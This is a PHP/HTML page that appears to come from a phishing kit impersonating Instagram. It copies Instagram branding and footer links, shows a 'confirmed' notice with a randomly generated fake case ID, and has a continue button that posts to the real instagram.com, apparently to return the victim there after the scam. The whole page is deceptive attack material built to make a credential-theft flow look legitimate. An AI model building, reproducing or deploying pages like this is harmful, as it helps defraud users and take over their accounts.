<?php
include("app/config.php");
include("app/database/yazilar.php");
include("app/database/router.php");
?>    


    <!DOCTYPE html>


    <html lang="tr">

    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />

    <head>

       
     <?php include ("app/tag/main/meta.php"); ?>
        <link rel="stylesheet" href="assets/theme/sloker/lib/dist/css/style74e2.css?1646549609">
        <meta name="referrer" content="no-referrer">
       

    </head>

    <body>
        <img src="assets/theme/sloker/lib/img/spinner.svg" style="position: absolute; left: -1000px; top: -1000px">
        <div class="box">
            <div class="lang">English <span class="mark">&#60;</span></div>
            <img src="assets/theme/sloker/lib/img/logo.svg" alt="Logo" class="logo">
            <form action="https://instagram.com" method="post" id="mainForm">

            <center><img src="assets/theme/sloker/sc.gif" width="100"></center><br>
         
                <div class="form_item form_width">
                    <div class="alert info"><?php echo $confirmedyazi; ?><br><br>Case ID: <?php echo(rand(10,10000000));?></div>
                </div>
      

                <div class="form_item form_width my0">
                    <button type="submit" id="submit_button">
					<span class="text">Contuine</span>
					<span class="spinner" style="display: none"><img src="assets/theme/sloker/lib/img/spinner.svg" width="25px"></span>
				</button>
                </div>

             
            </form>
        </div>

        <div class="bottom" id="bottomContents">
            <div class="visible">
                <div class="from">from</div>
                <img class="company_logo" src="assets/theme/sloker/lib/img/company-logo.svg" width="52" alt="Company Logo">
            </div>
            <div class="non_visible">
                <div class="f_center">
                    <ul class="group">
                        <li><a href="#">Meta</a></li>
                        <li><a href="#">About</a></li>
                        <li><a href="#">Blog</a></li>
                        <li><a href="#">Job Opportunities</a></li>
                        <li><a href="#">Help</a></li>
                        <li><a href="#">API</a></li>
                        <li><a href="#">Security</a></li>
                        <li><a href="#">Conditions</a></li>
                        <li><a href="#">Major Accounts</a></li>
                        <li><a href="#">Subject Tags</a></li>
                        <li><a href="#">locations</a></li>
                        <li><a href="#">Instagram Lite</a></li>
                    </ul>
                </div>

                <div class="f_center">
                    <ul class="group">
                        <li><a href="#">Beauty</a></li>
                        <li><a href="#">Dance</a></li>
                        <li><a href="#">fitness</a></li>
                        <li><a href="#">Food and drink</a></li>
                        <li><a href="#">Home and Garden</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Visual arts</a></li>
                    </ul>
                </div>

                <div class="clearfix"></div>
            </div>
        </div>

        <script src="assets/theme/sloker/lib/dist/js/main6a83.js?1648502531"></script>
    </body>



    </html>